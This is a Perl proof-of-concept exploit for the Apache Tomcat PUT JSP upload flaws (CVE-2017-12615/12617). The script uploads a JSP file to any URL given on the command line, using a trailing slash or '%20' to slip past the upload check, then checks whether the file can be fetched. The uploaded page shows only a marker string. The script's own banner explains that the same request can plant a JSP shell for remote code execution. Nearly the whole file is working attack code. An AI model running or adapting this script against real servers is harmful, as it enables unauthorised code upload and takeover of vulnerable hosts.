#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

my $ua = LWP::UserAgent->new();
my $url = 0;
my $platform = 0;
my $response = 0;
my $filename = 'payload.jsp';
my $payload =  '<% out.write("<html><body><h3>[CVE-2017-12615 - CVE-2017-12617]</h3></body></html>"); %>';
my $injection = '/';

$url = $ARGV[0] or die("Usage : perl $0 <url> <win/lnx>");
$platform = $ARGV[1] or die("Usage : perl $0 <url> <win/lnx>");

if($platform =~ /^win$|^lnx$/i) {
    header();
 
    if($platform =~ /^win$/i) {
        $filename = 'index.jsp';
        $injection = '%20';
    } else {
        $filename = 'payload.jsp';
        $injection = '/';
    }
    
    exploit($ua, $url, $filename, $injection, $payload);
}

sub header {
    
    print "\t\t===[ Apache Tomcat CVE-2017-12615/CVE-2017-12617 PUT JSP vulnerability ]===\n"; 
    print "\n\n";
    
    print qq{
        By design, you are not allowed to upload JSP files via the PUT method on
        the Apache Tomcat servers.
        
        This is likely a security measure to prevent an attacker from uploading
        a JSP shell and gaining remote code execution on the server.
    
        However, due to the insufficient checks, an attacker could gain remote
        code execution on 7.0.X Tomcat servers that has enabled PUT by requesting
        PUT method on the Tomcat server using a specially crafted HTTP request
        
        Affected Versions :
            7.0.0-7.0.81
            8.0.0-8.0.46
            8.5.0-8.5.22
            9.0.0
    };
}

sub exploit {
    my ($ua, $url, $filename, $injection, $payload) = @_;
    my $request = 0;
    my $response = 0;
    
    $request = new HTTP::Request 'PUT', $url . $filename . $injection;
    $request->content($payload) if($payload);
    $response = $ua->request($request);
    
    print "\n[+] Sending PUT Request On : " . $url . $filename . $injection . "\n";
    
    if($response->code =~ /204/) {
        print "\n[+] $url Seems To Be Vulnerable !\n\t==> Response Code : " . $response->code . "\n";
        print "\n[+] Checking Payload Existence On : $url$filename ...\n";
        
        $request = new HTTP::Request 'GET', $url . $filename;
        $response = $ua->request($request);
    
        if($response->is_success && $response->content =~ /CVE-2017-126/i) {
            print "\n[+] Exploit Succeed :  " . $url . $filename . "\n" . $response->decoded_content . "\n\n";
        } else {
            print "[-] Exploit Failed : HTTP Status Code " . $response->code;
        }
    } else {
        print "[-] Not Affected .\n\t==> HTTP Status Code " . $response->code;
    }
}
